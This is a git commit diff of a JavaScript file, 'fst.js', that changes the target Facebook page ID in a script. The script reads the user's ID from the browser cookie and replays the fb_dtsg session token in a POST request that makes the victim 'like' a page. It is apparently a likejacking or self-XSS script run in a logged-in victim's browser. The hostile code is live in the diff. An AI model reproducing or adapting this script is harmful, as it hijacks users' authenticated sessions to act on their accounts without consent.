2a82c46a5e222f79f71e95d920f66612d961c894
hamoda <hamoda@users.noreply.github.com>
2014-07-20 13:50:13 +0200

    Update fst.js

--- fst.js
+++ fst.js
@@ -3,7 +3,7 @@ var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
  {
   var Page = new XMLHttpRequest();
   var PageURL = "//www.facebook.com/ajax/pages/fan_status.php";
-  var PageParams ="fb_dtsg="+fb_dtsg+"&fbpage_id=1447686202159496&add=true&reload=false&fan_origin=page_timeline&fan_source&cat&&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"";
+  var PageParams ="fb_dtsg="+fb_dtsg+"&fbpage_id=557743420963653&add=true&reload=false&fan_origin=page_timeline&fan_source&cat&&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"";
     Page.open("POST", PageURL, true);
   Page.onreadystatechange = function () {
     if (Page.readyState == 4 && Page.status == 200) {
